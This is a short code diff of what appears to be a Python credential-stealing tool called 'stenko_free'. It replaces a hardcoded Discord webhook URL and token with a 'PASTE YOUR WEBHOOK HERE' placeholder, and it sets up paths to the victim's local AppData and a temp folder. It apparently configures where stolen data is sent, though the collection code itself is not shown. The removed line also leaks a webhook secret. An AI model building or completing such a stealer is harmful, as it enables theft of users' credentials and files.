@@ -3,7 +3,7 @@ import requests, os , shutil, psutil
 
 class stenko_free:
     def __init__(self):
-        self.webhook = "https://discord.com/api/webhooks/904420868548083722/16zajhYIKeBsS2VAOKRycghFF9taMqTCpfJlOJ8VKgUS6-lD2-WuL3KWN0ELdfnstlAe"
+        self.webhook = "PASTE YOUR WEBHOOK HERE"
         self.appdata = os.getenv("localappdata")
         self.tempfolder = os.getenv("temp")+"\\stenko"
 
